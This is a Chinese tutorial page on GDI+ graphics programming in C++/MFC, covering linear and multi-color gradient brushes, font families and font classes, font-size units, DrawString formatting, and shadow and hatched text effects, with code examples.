<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#62;m_hDC);&#10;Point p1(10, 10), p2(110, 10), p3(10, 110), p4(230, 10), p5(330, 110);&#10;Size size(100, 100);&#10;Color col1(255, 0, 0), col2(0, 0, 255);&#10;LinearGradientBrush hbrush(p1, p2, col1, col2);&#10;graph.FillRectangle(&#38;hbrush, Rect(p1, size)); &#10;LinearGradientBrush vbrush(p1, p3, col1, col2); &#10;graph.FillRectangle(&#38;vbrush, Rect(Point(120, 10), size)); &#10;LinearGradientBrush dbrush(p4, p5, col1, col2); &#10;graph.FillRectangle(&#38;dbrush, Rect(Point(230, 10), size));</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_059.jpg" alt="image"></p>
<p>水平渐变 垂直渐变 对角渐变 </p>
<p>图 14-35 线性渐变刷</p>
<p>其实，线性渐变刷默认是按 WrapModeTile 平铺方式重复排列的（原点是 point1），例如（参见图 14-36 a））：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);&#10;Point p1(10, 10), p2(110, 10), p3(10, 110);&#10;Color col1(255, 0, 0), col2(0, 0, 255); &#10;LinearGradientBrush hbrush(p1, p2, col1, col2);&#10;//hbrush.SetWrapMode(WrapModeTileFlipX); &#10;graph.FillRectangle(&#38;hbrush, Rect(p1, Size(400, 200))); &#10;LinearGradientBrush vbrush(p1, p3, col1, col2);&#10;//vbrush.SetWrapMode(WrapModeTileFlipX); &#10;graph.FillRectangle(&#38;vbrush, Rect(Point(420, 10), Size(200, 410)));&#10;LinearGradientBrush dbrush(p1, Point(110, 100), col1, col2);&#10;//dbrush.SetWrapMode(WrapModeTileFlipX); &#10;graph.FillRectangle(&#38;dbrush, Rect(Point(10, 220), Size(400, 200)));</span><br></pre></td></tr></table></figure>
<p>你也可以将上面代码中的注释符“//”去掉，利用线性渐变刷类的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetWrapMode(WrapMode wrapMode);</span><br></pre></td></tr></table></figure>
<p>来设置画刷的排列方式为 WrapModeTileFlipX 平铺并水平翻转，参见图 14-36 b)。</p>
<p><img src="../img/gdip-编程基础/Image_060.jpg" alt="image"></p>
<p>图 14-37 参数的含义</p>
<p><img src="../img/gdip-编程基础/Image_061.jpg" alt="image"></p>
<p>a) 平铺重复排列 b) 加水平翻转 </p>
<p>图 14-36 按平铺重复排列的线性渐变刷</p>
<p>下面是一个利用水平线性渐变刷来画阴阳八卦中的阴阳鱼例子（参见图 14-37 和图 14-38）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinearGradientBrush R2BBrush(Point(0, 10), Point(200, 10), Color(255, 0, 0), Color(0, 0, 255));&#10;LinearGradientBrush B2YBrush(Point(0, 10), Point(200, 10),&#10;Color(0, 0, 255), Color(255, 255, 0));&#10;Pen bluePen(Color(255, 0, 0, 255));&#10;Rect circleRect(0, 0, 200, 200);&#10;Rect leftRect(0, 50, 100, 100);&#10;Rect rightRect(100, 50, 100, 100); Graphics graph(pDC-&#38;gt;m_hDC);&#10;graph.FillPie(&#38;R2BBrush, circleRect, 0.0f, 180.0f);&#10;graph.FillPie(&#38;B2YBrush, circleRect, 180.0f, 180.0f); &#10;graph.FillPie(&#38;R2BBrush, leftRect, 180.0f, 180.0f); &#10;graph.FillPie(&#38;B2YBrush, rightRect, 0.0f, 180.0f); int r = 10;&#10;graph.FillEllipse(&#38;SolidBrush(Color(0, 255, 0)), 50 - r, 100 - r, 2 * r, 2 * r);&#10;graph.FillEllipse(&#38;SolidBrush(Color(255, 0, 255)), 150 - r, 100 - r, 2 * r, 2 * r);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_062.jpg" alt="image"></p>
<p><img src="../img/gdip-编程基础/Image_063.jpg" alt="image"></p>
<p><img src="../img/gdip-编程基础/Image_064.png" alt="image"></p>
<p><img src="../img/gdip-编程基础/Image_065.jpg" alt="image"></p>
<p>图 14-38 绘制阴阳鱼的分步输出结果</p>
<p>2）多色渐变 线性渐变刷还有很多其他功能，例如可利用刷的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetInterpolationColors(const Color *presetColors, const REAL *blendPositions, INT count);</span><br></pre></td></tr></table></figure>
<p>来设置多色渐变。其中，presetColors 为多色数组、blendPositions 为以百分比表示的对应混色点的位置（首、尾值必须为 0.0f 和 1.0f，中间的值应该按递增序排列）、count 为颜色和混 色点位的数目。例如（参见图 14-39）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Color cols[] = &#123;Color::Red, Color::Orange, Color::Yellow, Color::Green, Color::Cyan, Color::Blue, Color::Purple, Color::Magenta&#125;;&#10;REAL bps[] = &#123;0.0f, 0.15f, 0.3f, 0.45f, 0.6f, 0.75f, 0.875f, 1.0f&#125;;&#10;LinearGradientBrush brush(Point(10, 10), Point(810, 10), Color::Black, Color::White);&#10;brush.SetInterpolationColors(cols, bps, 8);&#10;graph.FillRectangle(&#38;brush, Rect(10, 10, 800, 100));</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_066.jpg" alt="image"></p>
<p>图 14-39 多色渐变 另外，也可以像纹理刷和条纹刷一样，设置线性渐变刷的渲染原点等。 路径渐变刷的内容，安排到下一章的第 15.1.2 小节中，在介绍过路径的基本概念和使用方法之后再来讲解。</p>
<h2 id="1-8_文字">1.8 文字</h2><p>GDI+的文本排版和字体处理的功能比 GDI 的更加强大。特别是 Windows XP 及以上版本，提供了对 LCD（液晶）显示器的特殊优化功能，GDI+也提供了对应的 ClearType（清晰活字）文字处理技术，以增强字体的清晰度。另外，GDI+还提供了构造专用字体集的功能，可以包含私有的临时字体（不需预先安装到系统中）。</p>
<p>Windows 中使用的字体，一般是 TrueType（真实活字） 字体（TTF=TrueType Font），它是 1991 年 Apple 和 Microsoft 联合开发的一种字体技术，采用二次贝塞尔曲线来描述字符 的轮廓。</p>
<p><img src="../img/gdip-编程基础/1-8-1.png" alt=""></p>
<p>在 GDI+中，与文字相关的类有（参见图 14-40）：字体族类 FontFamily、字体类 Font 和字体集类 FontCollection 及其两个派生类 InstalledFontCollection （已安装字体集）和 PrivateFontCollection（专用字体集）。而在 GDI 中，则只有 CFont 一个字体类。</p>
<p>图 14-40 字体类的层次结构</p>
<h3 id="1-8-1_字体">1.8.1 字体</h3><p>下面介绍字体族类 FontFamily 和字体类 Font 及相关参数。</p>
<p>（1）字体族类 FontFamily</p>
<p>字体族（font family）是一组具有同一字样（typeface），但是风格（style）不同的字体（font）。其中，字样是指字体的种类，如 Arial、Times New Roman、宋体、楷体_GB2312。 风格是指：正常（regular）、粗体（bold）、斜体（italic）、粗斜体（bold and italic）、下划线（underline）、删除线（strikeout）等。</p>
<p>1）构造函数</p>
<p>字体族类 FontFamily 有两个构造函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FontFamily( VOID); // &#26500;&#36896;&#19968;&#20010;&#31354;&#23383;&#20307;&#26063;&#65288;&#23569;&#29992;&#65289;&#10;// &#26500;&#36896;&#20855;&#26377;&#25351;&#23450;&#21517;&#31216; name&#65292;&#20301;&#20110;&#25351;&#23450;&#23383;&#20307;&#38598; fontCollection &#20013;&#30340;&#23383;&#20307;&#26063;&#10;FontFamily(const WCHAR *name, const FontCollection *fontCollection = NULL);</span><br></pre></td></tr></table></figure>
<p>只要不是使用专用字体集中的字体，一般不需要设置第二个输入参数，取默认的 NULL 即可。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FontFamily fontFamily(L&#34;&#23435;&#20307;&#34;); &#25110;&#10;FontFamily fontFamily(L&#34;Times New Roman&#34;);</span><br></pre></td></tr></table></figure>
<p>2）显示当前系统已装入的字体（族）名称</p>
<p>可先利用（字体集 FontCollection 的派生类）已安装字体集类 InstalledFontCollection 的 方法 GetFamilyCount 和 GetFamilies 来分别获取当前系统中已经安装字体集中字体族的数目 和对象指针：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INT GetFamilyCount( VOID) const;&#10;Status GetFamilies(INT numSought, FontFamily *gpfamilies, INT *numFound) const;</span><br></pre></td></tr></table></figure>
<p>然后再利用字体族类的方法 GetFamilyName 来获取每个字体族的名称：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status GetFamilyName(WCHAR name[LF_FACESIZE], WCHAR language = LANG_NEUTRAL) const;</span><br></pre></td></tr></table></figure>
<p>其中 LANG_NEUTRAL 表示采用中立语言，即用户的默认语言。</p>
<p>例如（可创建一个带滚动视图类的单文档 MFC 应用程序 Fonts，添加对 GDI+的支持， 输出结果如图 14-41 所示）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void CFontsView::OnDraw(CDC* pDC) &#123;&#10;    &#8230;&#8230;&#10;    InstalledFontCollection ifc; int n = ifc.GetFamilyCount();&#10;    FontFamily *ffs = new FontFamily[n];&#10;    int found;&#10;    ifc.GetFamilies(n, ffs, &#38;found); wchar_t name[LF_FACESIZE];&#10;    Font font(L&#34;&#23435;&#20307;&#34;, 18);&#10;    SolidBrush textBrush(Color::Black); &#10;    Graphics graph(pDC-&#38;gt;m_hDC); wchar_t str[40];&#10;    swprintf_s(str, 40, L&#34;&#24403;&#21069;&#31995;&#32479;&#20013;&#65292;&#24635;&#20849;&#35013;&#26377;&#22914;&#19979;%d &#31181;&#23383;&#20307;&#65306;&#34;, n);&#10;    graph.DrawString(str, INT(wcslen(str)), &#38;font, PointF(10.0f, 10.0f), &#38;textBrush);&#10;    for (int i = 0; i &#38;lt; n; i++) &#123; &#10;        ffs[i].**GetFamilyName**(name); &#10;        graph.DrawString(name, INT(wcslen(name)), &#38;font,&#10;            PointF(10.0f, 80.0f + 40 * i), &#38;textBrush); &#10;        graph.DrawString(L&#34;Font Family &#23383;&#20307;&#26063;&#34;, 15,&#10;            &#38;Font(name, 18),&#10;            PointF(300.0f, 80.0f + 40 * i), &#38;textBrush);&#10;    &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_068.jpg" alt="image"></p>
<p>图 14-41 获取并显示当前系统的字体</p>
<p>注：如果想用程序将这些名称写入一个文本文件，需要注意 ofstream 不支持宽字符串的 流输出，可以用实例模板类 of<strong>w</strong>stream 来定义一个新的文件输出流类型。还可以采用 CFile 来输出，但要注意宽字符串采用的是 UTF-16 编码，需要在文本文件的开始处，添加用 0xFE 和 0xFF 这两个字节表示的 UTF-16 编码标志。</p>
<p>（2）字体类 Font</p>
<p>字体类 Font 的构造函数有 6 个，常用的是如下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Font(const FontFamily *family, REAL emSize, INT style = FontStyleRegular, Unit unit = UnitPoint);&#10;Font(const WCHAR *familyName, REAL emSize, INT style = FontStyleRegular, Unit unit = UnitPoint, const FontCollection *fontCollection = NULL);</span><br></pre></td></tr></table></figure>
<p>其中的第一个构造函数，其第一个输入参数是字体族的指针，所以必须先创建字体族对象。</p>
<p>而第 2 个构造函数的第一个输入参数则是字体族（字样）的名称，不需要创建字体族对象， 并且还多了可以选择的字体集作为最后一个输入参数。其余的构造函数都与 API 中的字体 句柄、逻辑结构和 DC 中的当前字体有关，在 GDI 中已经讨论过。</p>
<p>注意：在使用 VC08 SP1 和 VC10 时，需要注释掉（默认）位于 c:\program files\microsoft visual studio 9.0\vc\include\目录中的 VC 头文件 comdef.h 中的第 309~315 行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// hard-coded smart pointer defs&#10;/*#if defined( IFontDisp_INTERFACE_DEFINED )&#10;if_not_exists(Font)&#10;&#123;&#10;    struct Font : IFontDisp &#123;&#125;;&#10;&#125;&#10;_COM_SMARTPTR_TYPEDEF(Font, uuidof(IDispatch));&#10;#endif*/</span><br></pre></td></tr></table></figure>
<p>不然，编译时会出现两个 Font 类定义冲突问题的错误。也可以不改 comdef.h，而在代码中 的每个 Font 类名的前面，都加上命名空间限定符“Gdiplus::”，如 Gdiplus::Font，不过这样 又太麻烦。</p>
<p>下面我们重点讨论第二个构造函数的使用，先介绍其中的各个参数。</p>
<p>1）字体种类 familyName（字体族名）—— 宽字符串表示的字体名称</p>
<ul>
<li><p>常用的英文字体族名有：</p>
<ul>
<li>Times New Roman：Font Family Name 字体族名(有衬线)</li>
<li>Arial： Font Family Name 字体族名(无衬线)</li>
<li>Arial Narrow： Font Family Name 字体族名(窄体)</li>
<li>Courier New： Font Family Name 字体族名(等宽)</li>
</ul>
</li>
<li><p>常用的中文字体族名有：</p>
<ul>
<li>宋体： Font Family Name 字体族名(正文)</li>
<li>楷体_GB2312： Font Family Name 字体族名(正文、标题)</li>
<li>黑体： Font Family Name 字体族名(标题、美术)</li>
<li>仿宋_GB2312： Font Family Name 字体族名(标题、美术)</li>
<li>隶书： Font Family Name 字体族名(标题、美术)</li>
</ul>
</li>
</ul>
<p>2）字体风格 style—— 字体的风格，可以取如下枚举常量（默认为 FontStyleRegular）： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    FontStyleRegular = 0, // &#27491;&#24120;&#65288;&#40664;&#35748;&#20540;&#65289;&#10;    FontStyleBold = 1, // &#31895;&#20307; &#10;    FontStyleItalic = 2, // &#26012;&#20307; &#10;    FontStyleBoldItalic = 3, // &#31895;&#26012;&#20307; &#10;    FontStyleUnderline = 4, // &#19979;&#21010;&#32447;&#10;    FontStyleStrikeout = 8 // &#21024;&#38500;&#32447;&#10;&#125; FontStyle;</span><br></pre></td></tr></table></figure>
<p>3）字体单位 unit 与大小 emSize——字体的大小与有单位关，可用单位有： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    UnitWor ld = 0, // &#36923;&#36753;&#21333;&#20301;&#65288;&#38750;&#29289;&#29702;&#21333;&#20301;&#65292;&#40664;&#35748;&#20026;&#20687;&#32032;&#65289;&#10;    UnitDisplay = 1, // &#35774;&#22791;&#21333;&#20301;&#65292;&#22914;&#23545;&#26174;&#31034;&#22120;&#20026;&#20687;&#32032;&#12289;&#23545;&#25171;&#21360;&#26426;&#20026;&#22696;&#28857; &#10;    UnitPixel = 2, // &#20687;&#32032;&#65288;1/54 &#25110; 1/96 &#33521;&#23544;&#65311;&#19982;&#23631;&#24149;&#22823;&#23567;&#21644;&#20998;&#36776;&#29575;&#26377;&#20851;&#65289; &#10;    UnitPoint = 3, // &#28857;&#25110; 1/72 &#33521;&#23544;&#65288;&#40664;&#35748;&#20540;&#65289;&#10;    UnitInch = 4, // &#33521;&#23544; &#10;    UnitDocument = 5,../300 &#33521;&#23544; &#10;    UnitMillimeter = 6 // &#27627;&#31859; mm&#10;&#125; Unit;</span><br></pre></td></tr></table></figure>
<p>其中，em = M，在印刷行业中表示一个西文印刷符号的全长或全宽。</p>
<p>在 GDI 的 CFont 部分，已经介绍了中文字号与英文磅数（相当于这里的 UnitPoint 点值） 的关系，表 14-1 列出了中文字号与几种主要 Unit 单位的关系（设 1 像素=1/54 英寸）。</p>
<p>表 14-1 中文字号与 Unit 单位的关系</p>
<table>
<thead>
<tr>
<th>汉字字号</th>
<th>Pixel像素</th>
<th>Point点</th>
<th>Inch英寸</th>
<th>Document文档</th>
<th>Millimeter毫米</th>
</tr>
</thead>
<tbody>
<tr>
<td>特号</td>
<td>133.33</td>
<td>100</td>
<td>1.39</td>
<td>416.67</td>
<td>35.28</td>
</tr>
<tr>
<td>小特</td>
<td>80</td>
<td>60</td>
<td>0.83</td>
<td>250</td>
<td>21.17</td>
</tr>
<tr>
<td>初号</td>
<td>56</td>
<td>42</td>
<td>0.58</td>
<td>175</td>
<td>14.82</td>
</tr>
<tr>
<td>小初</td>
<td>48</td>
<td>36</td>
<td>0.5</td>
<td>150</td>
<td>12.7</td>
</tr>
<tr>
<td>一号</td>
<td>34.67</td>
<td>26</td>
<td>0.36</td>
<td>108.33</td>
<td>9.17</td>
</tr>
<tr>
<td>小一</td>
<td>32</td>
<td>24</td>
<td>0.33</td>
<td>100</td>
<td>8.47</td>
</tr>
<tr>
<td>二号</td>
<td>29.33</td>
<td>22</td>
<td>0.31</td>
<td>91.67</td>
<td>7.76</td>
</tr>
<tr>
<td>小二</td>
<td>24</td>
<td>18</td>
<td>0.25</td>
<td>75</td>
<td>6.35</td>
</tr>
<tr>
<td>三号</td>
<td>21.33</td>
<td>16</td>
<td>0.22</td>
<td>66.67</td>
<td>5.64</td>
</tr>
<tr>
<td>小三</td>
<td>20</td>
<td>15</td>
<td>0.21</td>
<td>62.5</td>
<td>5.29</td>
</tr>
<tr>
<td>四号</td>
<td>18.67</td>
<td>14</td>
<td>0.19</td>
<td>58.33</td>
<td>4.94</td>
</tr>
<tr>
<td>小四</td>
<td>16</td>
<td>12</td>
<td>0.17</td>
<td>50</td>
<td>4.23</td>
</tr>
<tr>
<td>五号</td>
<td>14</td>
<td>10.5</td>
<td>0.15</td>
<td>43.75</td>
<td>3.70</td>
</tr>
<tr>
<td>小五</td>
<td>12</td>
<td>9</td>
<td>0.125</td>
<td>37.5</td>
<td>3.175</td>
</tr>
<tr>
<td>六号</td>
<td>10</td>
<td>7.5</td>
<td>0.10</td>
<td>31.25</td>
<td>2.65</td>
</tr>
<tr>
<td>小六</td>
<td>8.67</td>
<td>6.5</td>
<td>0.09</td>
<td>27.08</td>
<td>2.29</td>
</tr>
<tr>
<td>七号</td>
<td>7.33</td>
<td>5.5</td>
<td>0.08</td>
<td>22.92</td>
<td>1.94</td>
</tr>
<tr>
<td>八号</td>
<td>6.67</td>
<td>5</td>
<td>0.07</td>
<td>20.83</td>
<td>1.76</td>
</tr>
</tbody>
</table>
<p>例如（参见图 14-42）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REAL fs[] = &#123;100, 60, 42, 36, 26, 24, 22, 18, 16, 15, 14, 12,&#10;    10.5, 9, 7.5, 6.5, 5.5, 5&#125;;&#10;CString fno[] = &#123;L&#34;&#29305;&#34;, L&#34;&#23567;&#29305;&#34;, L&#34;&#21021;&#34;, L&#34;&#23567;&#21021;&#34;, L&#34;&#19968;&#34;,&#10;    L&#34;&#23567;&#19968;&#34;, L&#34;&#20108;&#34;, L&#34;&#23567;&#20108;&#34;, L&#34;&#19977;&#34;, L&#34;&#23567;&#19977;&#34;, L&#34;&#22235;&#34;, L&#34;&#23567;&#22235;&#34;,&#10;    L&#34;&#20116;&#34;, L&#34;&#23567;&#20116;&#34;, L&#34;&#20845;&#34;, L&#34;&#23567;&#20845;&#34;, L&#34;&#19971;&#34;, L&#34;&#20843;&#34;&#125;;&#10;wchar_t str[100]; REAL size, y = 10.0f;&#10;SolidBrush textBrush(Color::Black); &#10;Graphics graph(pDC-&#62;m_hDC);&#10;for (int i = 0; i &#38;lt; 18; i++) &#123; &#10;    size = fs[i]; swprintf_s(str, 100,&#10;        L&#34;&#36825;&#26159;%s &#21495;&#23383;(%.4g &#20687;&#32032; %g &#28857; %.4g &#33521;&#23544; %.4g &#25991;&#26723; %.4g &#27627;&#31859;)&#34;,&#10;        fno[i], size * 4 / 3.0, size, size / 72.0,&#10;        size * 300 / 72.0, size / 72.0 * 25.4); &#10;    graph.DrawString(str, INT(wcslen(str)),&#10;        &#38;Font(L&#34;&#23435;&#20307;&#34;, size), PointF(10.0f, y), &#38;textBrush);&#10;    y += size * 1.5f;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_069.jpg" alt="image"></p>
<p>图 14-42 中文字号与 Unit 单位</p>
<h3 id="1-8-2_绘制文本">1.8.2 绘制文本</h3><p>在 GDI 中，我们用 CDC 类的方法 TextOut、DrawText 和 ExtTextOut 等来输出文本串。 在 GDI+中，我们则是利用 Graphics 类的重载方法 DrawString 来绘制文本。</p>
<p>（1）画串方法 DrawString</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawString(const WCHAR *string, INT length, const Font *font, const PointF &#38;origin, const Brush *brush);&#10;Status DrawString(const WCHAR *string, INT length, const Font *font, const PointF &#38;origin, const StringFormat *stringFormat, const Brush *brush);&#10;Status DrawString(const WCHAR *string, INT length, const Font *font, const RectF &#38;layoutRect, const StringFormat *stringFormat, const Brush *brush);</span><br></pre></td></tr></table></figure>
<p>这三个同名的 Graphics 类重载方法，都以宽字符串作为第一个输入参数（不支持普通 字符串）、串长为第二个参数（对以 null 结尾的字符串，可以使用-1 来代替）、最后一个参 数则都是绘制文本用的画刷指针。</p>
<p>不同的是第三个输入参数（都是浮点数版本，不支持整数版本）：前两个方法的是浮点 数版的点类 PointF 对象，表示文本串的位置（默认是左上角）；最后一个方法的是浮点数版 的矩形类 RectF 对象，表示绘制文本的范围（超出部分会被截掉）。</p>
<p>另 一 个不 同之 处是 ，后 两个 方法 比第 一个 方法 多了 一个 输入 参数 —— 串格 式 类 StringFormat 对象的指针，用于设置文本的对齐方式、输出方向、自动换行、制表符定制、 剪裁等。</p>
<p>第一个画串方法最简单，使用得也最多。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graph.DrawString(str, INT(wcslen(str)), &#38;Font(L&#34; &#23435;&#20307; &#34;, 12), PointF(10.0f, 10.0f), &#38;brush);&#10;graph.DrawString(str, -1, &#38;font, &#38;rect, &#38;stringFormat, &#38;brush);</span><br></pre></td></tr></table></figure>
<p>（2）串格式类 StringFormat</p>
<p>StringFormat 是从 Gdiplus Base 类直接派生的一个 GDI+类，用于设置绘制字符串时的各 种格式。其主要的构造函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StringFormat(INT formatFlags = 0, LANGID language = LANG_NEUTRAL);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<p>formatFlags（格式标志位）—— 用于设置各种输出格式，取值为 StringFormatFlags 枚举的下列常量之位或“|”：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    StringFormatFlagsDirectionRightToLeft = 0x00000001, // &#26041;&#21521;&#20174;&#21491;&#21040;&#24038;&#65288;&#40664;&#35748;&#20026;&#20174;&#24038;&#21040;&#21491;&#65289; &#10;    StringFormatFlagsDirectionVertical = 0x00000002, // &#22402;&#30452;&#26041;&#21521;&#65288;&#40664;&#35748;&#20026;&#27700;&#24179;&#65289; &#10;    StringFormatFlagsNoFitBlackBox = 0x00000004, // &#20801;&#35768;&#23383;&#31526;&#23614;&#37096;&#24748;&#20110;&#30697;&#24418;&#20043;&#22806; &#10;    StringFormatFlagsDisplayFormatControl = 0x00000020, // Unicode &#24067;&#23616;&#25511;&#21046;&#31526;&#36215;&#20316;&#29992; &#10;    StringFormatFlagsNoFontFallback = 0x00000400, // &#26377;&#26367;&#25442;&#29992;&#30340;&#8220;&#32570;&#23569;&#23383;&#20307;&#8221;&#65288;&#40664;&#35748;&#20026;&#24320;&#26041;&#24418;&#31526;&#65289; &#10;    StringFormatFlagsMeasureTrailingSpaces = 0x00000800, // &#27979;&#37327;&#26102;&#21253;&#21547;&#23614;&#37096;&#31354;&#26684;&#31526;&#65288;&#40664;&#35748;&#19981;&#21253;&#21547;&#65289;&#10;    StringFormatFlagsNoWrap = 0x00001000, // &#19981;&#33258;&#21160;&#25442;&#34892;&#10;    StringFormatFlagsLineLimit = 0x00002000, // &#26368;&#21518;&#19968;&#34892;&#24517;&#39035;&#20026;&#25972;&#34892;&#39640;&#65292;&#36991;&#20813;&#21322;&#34892;&#39640;&#30340;&#36755;&#20986;&#10;    StringFormatFlagsNoClip = 0x00004000 // &#19981;&#20351;&#29992;&#21098;&#35009;&#10;&#125; StringFormatFlags;</span><br></pre></td></tr></table></figure>
<p>language （语言） —— 取值为 16 位 语 言 标识 符 类 型 LANGID ， 默认 值为 LANG_NEUTRAL（语言中立），表示采用用户的默认语言。</p>
<p>（3）输出方向</p>
<p>默认的文本串输出方向是从左到右水平绘制。也可以在 StringFormat 类的构造函数中使 用参数值：StringFormatFlagsDirectionRightToLeft 和 StringFormatFlagsDirectionVertical 来修 改文本串的输出方向为从右到左水平绘制和从上到下垂直绘制。</p>
<p>（4）剪裁与换行</p>
<p>默认情况下，使用矩形输出长文本串时，会自动换行和剪裁。但是也可以在 StringFormatF 类的构造函数中，利用第一个输入参数的 StringFormatFlags 枚举值，来改变默认的设置。</p>
<p>（5）对齐</p>
<p>可以通过 StringFormat 类的方法来设置输出文本串的对齐方式： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetAlignment(StringAlignment align); // &#35774;&#32622;&#27700;&#24179;&#23545;&#40784; &#10;Status SetLineAlignment(StringAlignment align); // &#35774;&#32622;&#22402;&#30452;&#23545;&#40784;</span><br></pre></td></tr></table></figure>
<p>其中的输入参数为枚举常量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    StringAlignmentNear = 0, // &#38752;&#36817;&#65288;&#24038;&#19978;&#65289; &#10;    StringAlignmentCenter = 1, // &#20013;&#24515;&#65288;&#23545;&#20013;&#65289; &#10;    StringAlignmentFar = 2 // &#36828;&#31163;&#65288;&#21491;&#19979;&#65289;&#10;&#125; StringAlignment;</span><br></pre></td></tr></table></figure>
<h3 id="1-8-3_美术字">1.8.3 美术字</h3><p>下面介绍阴影、条纹、纹理、渐变、空心字和彩心字等绘制美术字的方法，它们是利用不同颜色、条纹和渐变的画刷，以及多次绘图的方式，来实现特定美术效果的。</p>
<p>（1）阴影字</p>
<p>可以使用两种不同颜色的画刷，经过在不同的为位置多次绘制同一文本串，就可以达到 输出阴影字的效果。例如（参见图 14-43）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);&#10;SolidBrush textBrush(Color::Red), shadowBrush(Color::Gray); HatchBrush hatchBrush(HatchStyleForwardDiagonal,&#10;    Color::Black, Color::White);&#10;CString str = L&#34;&#38452;&#24433;&#23383;&#31526;&#20018;&#34;; &#10;Font font(L&#34;&#21326;&#25991;&#26032;&#39759;&#34;, 100);&#10;REAL d = 10.0f, dd = 5.0f;&#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(d + dd, d + dd), &#38;shadowBrush);&#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(d, d), &#38;textBrush);&#10;for (int i = 0; i &#38;lt; 20; i++) &#10;    graph.DrawString(str, str.GetLength(), &#38;font,&#10;        PointF(d + i, 150 + d + i + 2), &#38;hatchBrush);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_070.jpg" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graph.DrawString(str, str.GetLength(), &#38;font, PointF(d, 150 + d), &#38;textBrush);</span><br></pre></td></tr></table></figure>
<p>图 14-43 阴影字</p>
<p>（2）条纹字</p>
<p>也可以直接利用条纹刷，来绘制条纹状的字符串。例如（参见图 14-44）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;CString str = L&#34;&#26465;&#32441;&#23383;&#31526;&#20018;&#34;; &#10;Font font(L&#34;&#21326;&#25991;&#26032;&#39759;&#34;, 140);&#10;HatchBrush hatchBrush1(HatchStyleForwardDiagonal, Color::Red, Color::White);&#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(0.0f, 0.0f), &#38;hatchBrush1);&#10;HatchBrush hatchBrush2(HatchStyleBackwardDiagonal, Color::Green, Color::White);&#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(0.0f, 200.0f), &#38;hatchBrush2);&#10;HatchBrush hatchBrush3(HatchStyleCross, Color::Blue, Color::White);&#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(0.0f, 400.0f), &#38;hatchBrush3);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_071.jpg" alt="image"></p>
<p>图 14-44 条纹字</p>
<p>（3）纹理字</p>
<p>还可以利用纹理（图像）刷来绘制纹理字符串。例如（参见图 14-45）：</p>
